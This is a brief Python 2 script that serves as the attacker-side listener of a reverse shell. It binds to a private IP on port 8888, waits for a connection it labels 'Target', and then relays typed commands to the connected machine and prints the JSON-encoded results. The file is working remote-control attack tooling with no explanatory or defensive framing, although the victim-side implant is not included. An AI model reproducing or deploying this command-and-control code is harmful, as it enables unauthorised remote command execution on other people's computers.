#!/usr/bin/python

import socket
import json

def send(data):
        json_data = json.dumps(data)
        target.send(json_data)
        
        
def server():
        global target
        global var_s
        var_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        var_s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        var_s.bind(("172.19.127.22", 8888))
        var_s.listen(1)
        print("Listening for incoming connections......")
        target, ip = var_s.accept()
        print("Target Connected!!!!")


def receive():
        json_data = ""
        while True:
                try:
                        json_data += target.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue


def shell():
        while True:
                cmd = raw_input("Enter command: ")
                send(cmd)
                if cmd == "q":
                        break
                else:
                        result = receive()
                        print(result)


server()
shell()
var_s.close()
